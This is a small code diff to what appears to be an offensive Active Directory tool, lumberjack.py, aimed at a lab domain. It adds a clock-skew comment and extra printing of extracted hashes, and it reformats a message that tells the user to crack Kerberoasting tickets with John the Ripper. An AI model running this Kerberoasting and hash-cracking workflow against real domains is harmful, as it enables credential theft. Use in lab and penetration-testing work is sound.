@@ -43,6 +43,8 @@ except Exception as e:
 lumberjack.py
 """
 
+#use rdate -n x.x.x.x for clock skew
+
 custom_theme = Theme({"success": "cyan", "error": "red", "warning": "yellow", "status": "green", "info": "purple"})
 console = Console(theme=custom_theme)
 LDAP_BASE_DN = 'DC=hacklabtest,DC=local'
@@ -727,8 +729,7 @@ class ExploitAD(object):
 					for key, value in user_tickets.items():
 						f.write('{0}:{1}\n'.format(key, value))
 				if len(user_tickets.keys()) >= 1:
-					console.print('Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()),
-					domain))	
+					console.print('Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), domain))	
 			else:
 				console.print('Received {0} ticket(s) for Kerberoasting'.format(len(user_tickets.keys())))
 			
@@ -808,6 +809,8 @@ class ExploitAD(object):
 			with open('{0}-jtr-hashes'.format(domain), 'w') as f:
 				for h in hashes:
 					f.write(str(h) + '\n')
+					pprint (h)
+					print('')
 
 			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(domain))
 		else:
